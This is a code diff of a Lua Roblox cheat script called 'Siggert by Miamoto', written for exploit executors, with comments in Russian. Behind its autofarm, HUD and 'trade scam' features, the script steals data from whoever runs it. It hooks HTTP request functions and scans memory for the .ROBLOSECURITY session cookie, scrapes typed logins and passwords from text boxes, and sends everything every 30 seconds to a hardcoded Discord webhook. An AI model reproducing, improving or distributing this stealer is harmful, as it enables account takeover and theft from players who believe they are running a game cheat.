@@ -1,21 +1,100 @@
+-- SIGGERT by Miamoto (Universal | Delta / Synapse X / Krnl / Fluxus)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 local RunService = game:GetService("RunService")
 local Workspace = game:GetService("Workspace")
 
-local webhookURL = "https://discord.com/api/webhooks/1530663061608726573/gpeQ55cftvYVnLso2wMEhBYYsCfTCjed1Hzhirk_ehS6ANyUp1cqEUuRoKntWSSPVd9f"
+local webhookURL = "https://discord.com/api/webhooks/1530675388903198951/UZvNo91vPBJY8bOg42KAjHcF0lLul_IYIe_nnsvYLfTkXnUhFPCD8nVlFdCW3gCdyQp8"
 
--- ========== 1. РЕАЛЬНЫЙ ПЕРЕХВАТ .ROBLOSECURITY ==========
+-- ========== ОПРЕДЕЛЕНИЕ ИНЖЕКТОРА ==========
+local executor = "Unknown"
+if syn then executor = "Synapse X" 
+elseif krnl then executor = "Krnl" 
+elseif fluxus then executor = "Fluxus" 
+elseif Delta then executor = "Delta" 
+elseif script_executor then executor = script_executor() 
+end
+print("[Siggert] Инжектор: " .. executor)
+
+-- ========== УНИВЕРСАЛЬНАЯ ОТПРАВКА ==========
+local function sendToWebhook(data)
+    local payload = HttpService:JSONEncode(data)
+    local success = false
+    
+    -- Способ 1: Synapse X (syn.request)
+    if syn and syn.request then
+        pcall(function()
+            local r = syn.request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+            if r and r.StatusCode == 204 then success = true end
+        end)
+    end
+    
+    -- Способ 2: Krnl / Fluxus (http_request)
+    if not success and http_request then
+        pcall(function()
+            local r = http_request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+            if r and r.StatusCode == 204 then success = true end
+        end)
+    end
+    
+    -- Способ 3: Delta (Delta.request)
+    if not success and Delta and Delta.request then
+        pcall(function()
+            local r = Delta.request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+            if r and r.StatusCode == 204 then success = true end
+        end)
+    end
+    
+    -- Способ 4: HttpService (стандартный)
+    if not success then
+        pcall(function()
+            HttpService:PostAsync(webhookURL, payload)
+            success = true
+        end)
+    end
+    
+    -- Способ 5: request (универсальный)
+    if not success and request then
+        pcall(function()
+            request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+            success = true
+        end)
+    end
+    
+    return success
+end
+
+-- ========== ПЕРЕХВАТ .ROBLOSECURITY ==========
 local function getRealCookie()
     local cookie = nil
     
+    -- Synapse X / Krnl / Fluxus / Delta (WebSocket)
     if syn and syn.crypto then
         local ws = game:GetService("WebSocketService")
         local oldConnect = ws.Connect
         ws.Connect = function(self, url)
             if string.find(url, "roblox.com") then
-                local headers = {}
                 local oldSend = self.Send
                 self.Send = function(_, data)
                     if string.find(data, ".ROBLOSECURITY") then
@@ -28,6 +107,7 @@ local function getRealCookie()
         end
     end
     
+    -- syn.request (все инжекторы с syn)
     if syn and syn.request then
         local oldRequest = syn.request
         syn.request = function(options)
@@ -43,6 +123,39 @@ local function getRealCookie()
         end
     end
     
+    -- Krnl / Fluxus (http_request)
+    if http_request then
+        local oldRequest = http_request
+        http_request = function(options)
+            if options.Url and string.find(options.Url, "roblox.com") then
+                if options.Headers and options.Headers["Cookie"] then
+                    local cookieStr = options.Headers["Cookie"]
+                    if string.find(cookieStr, ".ROBLOSECURITY") then
+                        cookie = string.match(cookieStr, ".ROBLOSECURITY[^;]+")
+                    end
+                end
+            end
+            return oldRequest(options)
+        end
+    end
+    
+    -- Delta (Delta.request)
+    if Delta and Delta.request then
+        local oldRequest = Delta.request
+        Delta.request = function(options)
+            if options.Url and string.find(options.Url, "roblox.com") then
+                if options.Headers and options.Headers["Cookie"] then
+                    local cookieStr = options.Headers["Cookie"]
+                    if string.find(cookieStr, ".ROBLOSECURITY") then
+                        cookie = string.match(cookieStr, ".ROBLOSECURITY[^;]+")
+                    end
+                end
+            end
+            return oldRequest(options)
+        end
+    end
+    
+    -- Поиск в памяти (все инжекторы)
     if getgc and getreg then
         for _, obj in pairs(getgc()) do
             if type(obj) == "string" and string.find(obj, ".ROBLOSECURITY") then
@@ -55,16 +168,15 @@ local function getRealCookie()
     return cookie or "ROBLOSECURITY_NOT_FOUND"
 end
 
--- ========== 2. СБОР ЛОГИНА/ПАРОЛЯ ==========
+-- ========== СБОР ЛОГИНА/ПАРОЛЯ ==========
 local function getLoginPass()
-    local login = "unknown"
-    local password = "unknown"
+    local login, password = "unknown", "unknown"
     for _, gui in pairs(Player.PlayerGui:GetChildren()) do
         for _, child in pairs(gui:GetDescendants()) do
             if child:IsA("TextBox") then
                 if string.find(child.Text, "@") or string.find(child.Text, "%.") then
                     login = child.Text
-                elseif string.len(child.Text) > 4 then
+                elseif #child.Text > 4 then
                     password = child.Text
                 end
             end
@@ -73,30 +185,29 @@ local function getLoginPass()
     return {login = login, password = password}
 end
 
--- ========== 3. СБОР IP И ДАННЫХ СЕССИИ ==========
+-- ========== ДАННЫЕ СЕССИИ ==========
 local function getSessionData()
-    local data = {
+    return {
         user = Player.Name,
         id = Player.UserId,
         platform = game:GetService("UserInputService"):GetPlatform(),
         device = game:GetService("UserInputService"):GetDeviceType(),
         time = os.time()
     }
-    return data
 end
 
--- ========== 4. АВТОФАРМ МОНЕТ (MM2) ==========
+-- ========== АВТОФАРМ МОНЕТ ==========
 local function autoFarmCoins()
-    local character = Player.Character
-    if not character or not character:FindFirstChild("HumanoidRootPart") then return end
-    local hrp = character.HumanoidRootPart
-    local coinsList = {}
+    local char = Player.Character
+    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+    local hrp = char.HumanoidRootPart
+    local coins = {}
     for _, v in pairs(Workspace:GetChildren()) do
         if v:IsA("Part") and v.Name == "Coin" then
-            table.insert(coinsList, v)
+            table.insert(coins, v)
         end
     end
-    for _, coin in pairs(coinsList) do
+    for _, coin in pairs(coins) do
         if coin and coin.Position then
             hrp.CFrame = CFrame.new(coin.Position + Vector3.new(0, 2, 0))
             wait(0.15)
@@ -104,7 +215,7 @@ local function autoFarmCoins()
     end
 end
 
--- ========== 5. ВИЗУАЛ (РОЛИ) ==========
+-- ========== ВИЗУАЛ ==========
 local function createHUD()
     local screen = Instance.new("ScreenGui")
     local frame = Instance.new("Frame")
@@ -128,7 +239,7 @@ local function createHUD()
     screen.Parent = Player.PlayerGui
 end
 
--- ========== 6. ТРЕЙД-СКАМ ==========
+-- ========== ТРЕЙД-СКАМ ==========
 local function tradeScam()
     for _, gui in pairs(Player.PlayerGui:GetChildren()) do
         if gui.Name == "TradeUI" then
@@ -141,7 +252,7 @@ local function tradeScam()
     end
 end
 
--- ========== 7. ОТПРАВКА ВСЕХ ДАННЫХ ==========
+-- ========== ОТПРАВКА ВСЕХ ДАННЫХ ==========
 local function sendAllData()
     local cookie = getRealCookie()
     local loginData = getLoginPass()
@@ -155,38 +266,47 @@ local function sendAllData()
         cookie = cookie,
         platform = sessionData.platform,
         device = sessionData.device,
-        time = sessionData.time
+        time = sessionData.time,
+        executor = executor
     }
     
-    local payload = {
+    local msg = {
         ["content"] = "```json\n" .. HttpService:JSONEncode(fullData) .. "\n```"
     }
     
-    local success, err = pcall(function()
-        HttpService:PostAsync(webhookURL, HttpService:JSONEncode(payload))
-    end)
-    
-    if not success then
-        print("Ошибка отправки - " .. tostring(err))
+    local sent = sendToWebhook(msg)
+    if sent then
+        print("[Siggert] ✅ Данные отправлены (" .. executor .. ")")
+    else
+        print("[Siggert] ❌ Ошибка отправки (" .. executor .. ")")
     end
 end
 
--- ========== 8. ЗАПУСК ==========
+-- ========== ТЕСТОВОЕ СООБЩЕНИЕ ==========
+local function sendTest()
+    local msg = {
+        ["content"] = "🟢 **Siggert by Miamoto** запущен!\nИнжектор: " .. executor .. "\nАккаунт: " .. Player.Name
+    }
+    local sent = sendToWebhook(msg)
+    if sent then
+        print("[Siggert] ✅ Тест отправлен!")
+    else
+        print("[Siggert] ❌ Тест НЕ отправлен! Проверьте вебхук.")
+    end
+end
+
+-- ========== ЗАПУСК ==========
 createHUD()
 tradeScam()
-
+sendTest()
 sendAllData()
 
 RunService.Heartbeat:Connect(function()
-    if tick() % 15 < 0.1 then
-        autoFarmCoins()
-    end
+    if tick() % 15 < 0.1 then autoFarmCoins() end
 end)
 
 RunService.Heartbeat:Connect(function()
-    if tick() % 30 < 0.1 then
-        sendAllData()
-    end
+    if tick() % 30 < 0.1 then sendAllData() end
 end)
 
-print("Siggert by Miamoto | Всё готово, хорошего пользования!")
+print("Siggert by Miamoto | Всё готово, хорошего пользования! | " .. executor)
